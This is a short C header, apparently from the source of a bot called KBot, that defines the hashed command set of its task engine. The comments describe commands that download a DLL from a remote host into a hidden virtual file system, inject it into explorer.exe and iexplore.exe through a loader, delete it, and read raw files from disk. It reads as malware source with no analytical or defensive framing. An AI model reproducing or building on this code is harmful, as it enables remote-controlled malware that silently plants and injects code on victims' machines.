//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// KBot project.
//	
// module: tasks.h
// $Revision: 13 $
// $Date: 2012-02-20 18:55:12 +0400 (Пн, 20 фев 2012) $
// description: 
//	Tasks processing engine.

// Command CRC32 hashes
#define	CRC_LOAD_FILE		0x8655a116
#define	CRC_DELETE_FILE		0x7aa3ded9
#define	CRC_SET_INJECT		0x249c4b3d
#define	CRC_GET_INJECT		0x0ad96aaf
#define CRC_READ_FILE		0x7397243d


// Supported commands
// Note that command names are case-sensitive, but command parameters are not.

// LOAD_FILE http://myhost.com/myfile.dll myfile32.dll	- downloads file http://myhost.com/myfile.dll and saves it to the VFS 
//	as \MYFILE32.DLL
// DELETE_FILE	myfile32.dll							- deletes file \MYFILE32.DLL from the VFS
// SET_INJECT	myfile32.dll explorer.exe iexplore.exe	- requests the KLOADER to inject \MYFILE32.DLL into the specified processes
// READ_FILE \??\C:\myfile.dll myfile.dll				- чтение файла с диска

